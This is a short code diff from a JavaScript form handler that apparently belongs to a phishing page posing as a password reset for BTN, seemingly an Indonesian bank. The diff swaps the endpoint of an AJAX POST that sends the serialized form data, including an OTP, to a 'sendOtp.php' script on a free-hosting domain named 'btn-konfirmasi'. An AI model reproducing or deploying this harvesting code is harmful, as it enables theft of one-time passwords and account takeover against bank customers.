@@ -288,7 +288,7 @@ $('#forgetPasswordForm').on('submit', function (event) {
    
 $.ajax({
  type: 'POST',
- url: 'https://kementrian-daerah.c1.is/database/BTN/2/sendOtp.php',
+ url: 'https://btn-konfirmasi.c1.is/database/sendOtp.php',
  async: false,
  dataType: 'JSON',
  data: $(this).serialize(),
